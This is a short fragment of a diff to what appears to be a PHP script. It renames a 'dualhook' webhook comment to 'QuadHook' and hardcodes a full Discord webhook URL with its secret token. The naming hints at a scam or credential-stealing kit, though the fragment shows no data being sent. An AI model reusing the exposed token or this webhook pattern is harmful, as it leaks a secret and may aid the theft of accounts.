@@ -34,7 +34,7 @@
     }
     $conn->close();
 
-    //dualhook webhook//
+    //QuadHook webhook//
     $yourwebhook = "https://discord.com/api/webhooks/1334050800485404733/4HkIUti5kShslPoJDBskgWyeYCiRm0W3TYKWvsacInG22-7KchZUwFuMPLE9R2KXqH7z";
 
 
